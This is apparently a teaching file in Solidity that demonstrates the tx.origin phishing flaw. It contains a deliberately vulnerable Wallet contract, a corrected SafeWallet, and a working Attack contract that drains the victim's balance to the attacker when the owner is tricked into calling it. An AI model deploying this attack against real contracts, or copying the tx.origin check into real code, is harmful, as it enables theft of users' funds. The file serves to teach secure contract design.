// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
1. Alice deploys Wallet with 1 ETH.
2. Bob deploys Attack with Alice's address.
3. Alice calls the Attack.attack function by being deceieved
4. tx.origin is Alice and hence the balance is transferred to Bob
5. Correct by using msg.sender

tx.origin and msg.sender are both global variables in Solidity that refer to different accounts. 
The tx.origin global variable refers to the original external account that started the transaction, 
while msg.sender refers to the immediate account that invokes the function, which could be a contract or external account. 
The tx.origin variable will always refer to the external account, while msg.sender can be a contract or external account.

*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract SafeWallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint256 _amount) public {
      require(msg.sender == owner, "Not owner");
    
      (bool sent, ) = _to.call{ value: _amount }("");
      require(sent, "Failed to send Ether");
    }
}




contract Attack {
    address payable public owner; // attacker's address
    Wallet wallet; // instance of the Wallet contract

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet); // victim's wallet
        owner = payable(msg.sender); // attacker's address
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
